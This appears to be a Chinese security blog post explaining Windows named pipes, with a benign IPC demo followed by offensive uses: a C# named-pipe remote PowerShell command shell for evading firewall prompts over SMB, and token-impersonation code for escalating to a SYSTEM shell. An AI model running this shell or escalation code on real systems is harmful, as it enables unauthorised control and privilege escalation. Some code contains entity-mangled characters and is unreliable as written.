原创 lengyi 合天智汇

前言：

最近学校开了操作系统这门课，记录自己学习命名管道中与网络安全有关的内容。

关于命名管道：

“命名管道”又名“命名管线”（Named Pipes），是一种简单的进程间通信（IPC）机制，Microsoft
Windows大都提供了对它的支持（但不包括Windows
CE）。命名管道可在同一台计算机的不同进程之间或在跨越一个网络的不同计算机的不同进程之间，支持可靠的、单向或双向的数据通信。推荐用命名管道作为进程通信方案的一项重要的原因是它们充分利用了Windows内建的安全特性（ACL等）。

用命名管道来设计跨计算机应用程序实际非常简单，并不需要事先深入掌握底层网络传送协议（如TCP、UDP、IP、IPX）的知识。这是由于命名管道利用了微软网络提供者（MSNP）重定向器通过同一个网络在各进程间建立通信，这样一来，应用程序便不必关心网络协议的细节。

命名管道是一个具有名称，可以单向或双面在一个服务器和一个或多个客户端之间进行通讯的管道。命名管道的所有实例拥有相同的名称，但是每个实例都有其自己的缓冲区和句柄，用来为不同客户端通许提供独立的管道。使用实例可使多个管道客户端同时使用相同的命名管道。

命名管道的名称在本系统中是唯一的。

命名管道可以被任意符合权限要求的进程访问。

命名管道只能在本地创建。

命名管道的客户端可以是本地进程（本地访问：\\.\pipe\PipeName）或者是远程进程（访问远程：\ServerName\pipe\PipeName）。

命名管道使用比匿名管道灵活，服务端、客户端可以是任意进程，匿名管道一般情况下用于父子进程通讯。

列出计算机内所有的命名管道：

在powershell3以上的版本中，我们可以使用

[System.IO.Directory]::GetFiles("\\\\.\\\pipe\\\")

来查看本机上所有的存在的命名管道，或者使用process explorer来进行查看

![v2-20b002d8ab25431c844ca954542d85a3_720w](https://pic2.zhimg.com/80/v2-20b002d8ab25431c844ca954542d85a3_720w.jpeg)

命名管道的创建及通信

在windows中命名管道的通信方式是：

①创建命名管道 －－> ②连接命名管道 －－> ③读写命名管道

详细过程如下：

命名管道通过调用函数CreateNamedPipe()创建，函数原型如下：

    
    
    HANDLE WINAPI CreateNamedPipe(
      _In_     LPCTSTR               lpName,
      _In_     DWORD                 dwOpenMode,
      _In_     DWORD                 dwPipeMode,
      _In_     DWORD                 nMaxInstances,
      _In_     DWORD                 nOutBufferSize,
      _In_     DWORD                 nInBufferSize,
      _In_     DWORD                 nDefaultTimeOut,
      _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes
    );

详细参数可以参考：<https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea>

创建完成后服务端可以调用函数ConnectNamedPipe()等待客户端的连接请求，函数原型如下：

    
    
     BOOL WINAPI ConnectNamedPipe(
      _In_        HANDLE       hNamedPipe,
     _Inout_opt_ LPOVERLAPPED lpOverlapped
    );

详细参数可以参考：<https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe>

对于客户端而言，在连接服务器创建的命名管道前需要判断该命名管道是否可用，可调用函数WaitNamedPipe()实现

函数原型如下：

    
    
    BOOL WaitNamedPipeA(
      LPCSTR lpNamedPipeName,
      DWORD  nTimeOut
    );

详细参数可以参考：<https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-waitnamedpipea>

当WaitNamedPipe()调用成功后，便可使用CreateFile()将命名管道打开已获得管道的句柄。

然后客户端对命名管道的读写操作利用函数ReadFile()和WriteFile()完成，函数原型如下：

    
    
    BOOL WriteFile(
      HANDLE       hFile,
      LPCVOID      lpBuffer,
      DWORD        nNumberOfBytesToWrite,
      LPDWORD      lpNumberOfBytesWritten,
      LPOVERLAPPED lpOverlapped
    );
    BOOL ReadFile(
      HANDLE       hFile,
      LPVOID       lpBuffer,
      DWORD        nNumberOfBytesToRead,
      LPDWORD      lpNumberOfBytesRead,
      LPOVERLAPPED lpOverlapped
    );

具体参数可以参考：

[WriteFile function (fileapi.h) - Win32 apps](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-writefile)

[ReadFile function (fileapi.h) - Win32 apps](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-readfile)

demo：

下面是一个命名管道通信的小demo：

服务端：

    
    
    #include<Windows.h>
    #include<iostream>
     
    #define BUF_SIZE 1024
     
    using namespace std;
     
    int main(int argc,char * argv[]) {
     
    HANDLE h_pipe;
    char rev_buf[BUF_SIZE];
    DWORD rel_buf;
     
    h_pipe = CreateNamedPipe(
    "\\\\.\\pipe\\pipename",
    PIPE_ACCESS_INBOUND,
    PIPE_READMODE_BYTE | PIPE_WAIT,
    PIPE_UNLIMITED_INSTANCES,
    BUF_SIZE,
    BUF_SIZE,
    0,
    nullptr
    );
     
    if (h_pipe == INVALID_HANDLE_VALUE) {
    cout<<"NamedPipe Create fail!!!"<<GetLastError()<<endl;
    system("pause");
    return 1;
    }
    else
    {
    cout<<"NamedPipe Create Successful !!!"<<endl;
    }
    if (ConnectNamedPipe(h_pipe,nullptr)) {
    cout<<"NamedPipe Connected !!!"<<endl;
    memset(rev_buf,0,BUF_SIZE);
    if (ReadFile(h_pipe, rev_buf, BUF_SIZE, &rel_buf, nullptr)) {
    cout<<"Revecve Data Successful !!!"<<rev_buf<<endl;
    }
    else
    {
    cout << "Revecve Data Fail !!!" << GetLastError() << endl;
    CloseHandle(h_pipe);
    system("pause");
    return 1;
    }
    }
    CloseHandle(h_pipe);
    return 0;
    }

客户端：

    
    
    #include<Windows.h>
    #include<iostream>
    #define BUF_SIZE 1024
     
    using namespace std;
     
    int main(int argv,char * argc[]) {
     
     HANDLE h_pipe;
         char buf_msg[] = "Test for named pipe...";
         DWORD num_rcv; //实际接收到的字节数
         cout << "Try to connect named pipe...\n";
             if (WaitNamedPipe("\\\\.\\pipe\\pipename", NMPWAIT_WAIT_FOREVER))
             {
                 //打开指定命名管道
                 h_pipe = CreateFile("\\\\.\\pipe\\pipename", GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
                 if (h_pipe == INVALID_HANDLE_VALUE)
                 {
                     cerr << "Failed to open the appointed named pipe!Error code: " << GetLastError() << "\n";
                     system("pause");
                     return 1;
                 }
                 else
                 {
                     if (WriteFile(h_pipe, buf_msg, BUF_SIZE, #_rcv, nullptr))
                     {
                         cout << "Message sent successfully...\n";
                     }
                     else
                     {
                         cerr << "Failed to send message!Error code: " << GetLastError() << "\n";
                         CloseHandle(h_pipe);
                         system("pause");
                         return 1;
                     }
                 }
                 CloseHandle(h_pipe);
             }
             system("pause");
             return 0;
    }

效果如下：

![v2-7b894339e2d620b20b22a0900c258f0b_720w](https://pic2.zhimg.com/80/v2-7b894339e2d620b20b22a0900c258f0b_720w.jpeg)

PS:实现长链接的话记得开新线程哦。

实际利用

绕过防火墙：

那么这个东西有什么用呢？我们在渗透的过程中经常会看到下面这种情况：

![v2-0138e72bb567868b9b48676f907f8e7e_720w](https://pic3.zhimg.com/80/v2-0138e72bb567868b9b48676f907f8e7e_720w.jpeg)

在 Windows 中，当尝试使用 Bind() 绑定一个 TCP Socket 时，Defender
会弹窗提示是否允许此程序进行网络连接，只有用户点击允许访问才可放行。我们可以利用添加防火墙规则的办法来绕过这个限制，但是，如果你不是administrator权限，也就ＧＧ了，这个时候我们还有另外的办法就是利用命名管道，命名管道网络通信使用了未加密的SMB协议（端口445）或DCE\RPC（端口135）。在
Windows 中，通常默认允许 SMB 协议 出入站，因此，如果有什么功能或机制可以用于与外部机器进行通信的，SMB 协议
无疑是一种很好的选择。所以我们可以基于命名管道与外部机器进行通信，从而建立控制通道。

这里就直接拿rocll大佬的代码过来了：

    
    
    private static void WaitData()
    {
        // 创建一个运行空间
        Runspace runspace = null;
        runspace = RunspaceFactory.CreateRunspace();
        runspace.ApartmentState = System.Threading.ApartmentState.STA;
        runspace.Open();
     
        while(true)
        {
            using (var pipeServer = new NamedPipeServerStream(
                "testpipe",
                PipeDirection.InOut,
                NamedPipeServerStream.MaxAllowedServerInstances,
                PipeTransmissionMode.Message))
            {
                Console.WriteLine("[*] Waiting for client connection...");
                pipeServer.WaitForConnection();
                Console.WriteLine("[*] Client connected.");
                while (true)
                {
                    var messageBytes = ReadMessage(pipeServer);
                    var line = Encoding.Default.GetString(messageBytes);
                    Console.WriteLine("[*] Received: {0}", line);
                    if (line.ToLower() == "exit")
                    {
                        return;
                    }
     
                    // 参考：https://decoder.cloud/2017/11/02/we-dont-need-powershell-exe/
                    try
                    {
                        Pipeline PsPipe = runspace.CreatePipeline();
                        PsPipe.Commands.AddScript(line);
                        PsPipe.Commands.Add("Out-String");
                        Collection<PSObject> results = PsPipe.Invoke();
                        StringBuilder stringBuilder = new StringBuilder();
                        foreach (PSObject obj in results)
                        {
                            stringBuilder.AppendLine(obj.ToString());
                        }
     
                        var response = Encoding.Default.GetBytes(stringBuilder.ToString());
     
                        try
                        {
                            pipeServer.Write(response, 0, response.Length);
                        }
                        catch
                        {
                            Console.WriteLine("[!] Pipe is broken!");
                            break;
                        }
                    }
                    catch (Exception e){}
                }
            }
        }
    }
    private static void SendData(string ServerName)
    {
        Console.WriteLine("[+] Connecting to " + ServerName);
        using (var pipeClient = new NamedPipeClientStream(ServerName, "testpipe", PipeDirection.InOut))
        {
            pipeClient.Connect(5000);
            pipeClient.ReadMode = PipeTransmissionMode.Message;
            Console.WriteLine("[+] Connection established succesfully.");
            do
            {   
                Console.Write("csexec> ");
                var input = Console.ReadLine();
                if (String.IsNullOrEmpty(input)) continue;
                byte[] bytes = Encoding.Default.GetBytes(input);
                pipeClient.Write(bytes, 0, bytes.Length);
                if (input.ToLower() == "exit") return;
                var result = ReadMessage(pipeClient);
                Console.WriteLine();
                Console.WriteLine(Encoding.Default.GetString(result));
            } while (true);
        }
    }

模拟令牌：

这也是命名管道中常见的一种方法，一般可以用来提权操作，我们cobaltstrike中的getsystem也就是这个原理，官方给出的内容为：

Technique 1 creates a named pipe from Meterpreter. It also creates and runs a
service that runs cmd.exe /c echo “some data” >\\\\.\pipe\\[random pipe here].
When the spawned cmd.exe connects to Meterpreter’s named pipe, Meterpreter has
the opportunity to impersonate that security context. Impersonation of clients
is a named pipes feature. The context of the service is SYSTEM, so when you
impersonate it, you become SYSTEM.

大体意思也就是说，msf会创建一个命名管道，然后创建一个服务去运行cmd.exe /c echo “some data”
>\\\\.\pipe\\[random pipe
here]，当cmd连接到Meterpreter的明明管道的时候，因为服务是system权限，msf也就得到了一个system的shell。

Windows提供了这样的API，ImpersonateNamedPipeClient API调用是getsystem模块功能的关键。

ImpersonateNamedPipeClient允许命名管道模拟客户端的服务器端。调用此函数时，命名管道文件系统会更改调用进程的线程，以开始模拟从管道读取的最后一条消息的安全内容。只有管道的服务器端可以调用此函数。

在msf的meterpreter/source/extensions/stdapi/server/sys/process/process.c文件中，你可以看到它做了以下操作，派生令牌获取shell：

    
    
    if (ImpersonateNamedPipeClient(namedPipe) == 0) {
    printf("[!] Error impersonating client\n");
    return 0;
    }
       
       if (!CreateProcessAsUserA(newtoken, NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, π)) {
    printf("[!] CreateProcessAsUser failed (%d), trying another method.\n", GetLastError());
     
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(π, sizeof(pi));
     
    // Sometimes we fail above (as shown at meterpreter/source/extensions/stdapi/server/sys/process/process.c)
    if (!CreateProcessWithTokenW(newtoken, LOGON_NETCREDENTIALS_ONLY, NULL, L"cmd.exe", NULL, NULL, NULL, (LPSTARTUPINFOW)&si, π)) {
    printf("[!] CreateProcessWithToken failed (%d).\n", GetLastError());
    return 0;
    }
    }

然后我们就可以使用下面的办法模拟令牌获取一个system的shell：

    
    
    HANDLE
    threadToken = NULL,
    duplicatedToken = NULL;
     
    OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, &threadToken);
    DuplicateTokenEx(threadToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicatedToken);
    err = GetLastError();
    CreateProcessWithTokenW(duplicatedToken, 0, command, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, π);

![v2-761e58781f5be652d1f2202c45364809_720w](https://pic3.zhimg.com/80/v2-761e58781f5be652d1f2202c45364809_720w.jpeg)

一些细节：

为了防止滥用模仿机制，Windows不允许服务器在没有得到客户同意的情况下执行模仿。客户进程在连接到服务器的时候可以指定一个SQOS（security
quality of
service），以此限制服务器进程可以执行的模拟等级。通过C++代码访问命名管道一般采用CreateFile函数，可以通过指定SECURITYANONYMOUS、SECURITYIDENTIFICATION、SECURITYIMPERSONATION、SECURITYDELEGATION作为标记。
默认调用CreateFile函数访问命名管道时采用的权限就是IMPERSONATION级别，只能用于模拟本地权限，无法应用域远程访问。其中权限最高的级别为DELEGATION，当客户端模拟级别设置为此级别时，服务端可以任意模拟客户端权限，包括本地和远程。

写在后面：

windows系统博大精深，还需慢慢学习。

参考文章：

<https://www.anquanke.com/post/id/187497>

<http://www.secwk.com/2019/11/04/13659/>

<https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation>

<https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/>

<https://rcoil.me/2019/11/%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93/>

<https://rootrain.me/2020/02/29/%E6%B5%85%E6%9E%90%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93/>

IPC$管道的利用与远程控制

<http://hetianlab.com/expc.do?ce=11594776-0ba3-482a-8b0c-b0a6b803d8e3>(IPC$
(Internet Process Connection)

是共享“命名管道”的资源，它是为了让进程间通信而开放的命名管道)

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

